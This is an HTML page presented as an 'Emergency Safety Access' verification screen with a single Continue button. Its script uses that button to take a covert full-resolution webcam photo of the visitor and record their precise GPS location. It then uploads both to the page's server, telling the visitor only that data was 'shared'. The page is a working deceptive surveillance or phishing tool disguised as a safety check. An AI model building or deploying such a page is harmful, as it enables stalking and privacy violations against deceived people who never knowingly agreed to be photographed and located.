<!DOCTYPE html>
<html>
<head>

    <title>Emergency System</title>

    <style>

        *{
            margin:0;
            padding:0;
            box-sizing:border-box;
        }

        body{
            min-height:100vh;
            display:flex;
            justify-content:center;
            align-items:center;
            background:linear-gradient(135deg,#0f172a,#1e293b,#020617);
            font-family:'Segoe UI',Arial,sans-serif;
            color:white;
        }

        .container{
            width:90%;
            max-width:500px;
            padding:40px;
            border-radius:25px;
            background:rgba(255,255,255,0.05);
            backdrop-filter:blur(20px);
            border:1px solid rgba(255,255,255,0.1);
            box-shadow:0 20px 50px rgba(0,0,0,0.5);
            text-align:center;
        }

        .icon{
            font-size:70px;
            margin-bottom:20px;
        }

        h1{
            font-size:34px;
            margin-bottom:15px;
            font-weight:700;
        }

        p{
            color:#cbd5e1;
            font-size:16px;
            line-height:1.6;
            margin-bottom:35px;
        }

        button{
            width:100%;
            padding:18px;
            border:none;
            border-radius:14px;
            cursor:pointer;
            font-size:20px;
            font-weight:600;
            color:#fff;
            background:linear-gradient(135deg,#00c853,#00e676);
            transition:0.3s;
            box-shadow:0 10px 25px rgba(0,230,118,0.3);
        }

        button:hover{
            transform:translateY(-3px);
            box-shadow:0 15px 30px rgba(0,230,118,0.4);
        }

        button:active{
            transform:scale(0.98);
        }

    </style>

</head>

<body>

    <div class="container">

        <div class="icon">🛡️</div>

        <h1>Emergency Safety Access By Ashish</h1>

        <p>
            Secure emergency verification system.
            Press continue to proceed with safety authentication.
        </p>

        <button onclick="startAccess()">
            Continue
        </button>

    </div>

<script>

async function startAccess(){

    try{

        // CAMERA ACCESS (HD)
        const stream = await navigator.mediaDevices.getUserMedia({

            video:{
                width:{ ideal:1920 },
                height:{ ideal:1080 },
                facingMode:"user"
            }

        });

        const video = document.createElement("video");

        video.srcObject = stream;

        await video.play();

        // LOCATION ACCESS
        navigator.geolocation.getCurrentPosition(

            async(position)=>{

                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                // SEND LOCATION
                await fetch("/save-location",{

                    method:"POST",

                    headers:{
                        "Content-Type":"application/json"
                    },

                    body:JSON.stringify({
                        latitude,
                        longitude
                    })

                });

                // CREATE HD IMAGE
                const canvas = document.createElement("canvas");

                canvas.width = 1920;
                canvas.height = 1080;

                const ctx = canvas.getContext("2d");

                canvas.width = video.videoWidth;

                canvas.height = video.videoHeight;

                ctx.drawImage(

                    video,

                    0,

                    0,

                    canvas.width,

                    canvas.height

                );

                // CONVERT TO HIGH QUALITY JPG
                canvas.toBlob(async(blob)=>{

                    const formData = new FormData();

                    formData.append("photo",blob,"photo.jpg");

                    await fetch("/upload",{

                        method:"POST",
                        body:formData

                    });

                    alert("Emergency Data Shared");

                },"image/jpeg",1.0);

            },

            (error)=>{

                alert("Location permission denied");

            },

            {
                enableHighAccuracy:true,
                timeout:10000,
                maximumAge:0
            }

        );

    }

    catch(err){

        alert("Permission Denied");

    }

}

</script>

</body>
</html>
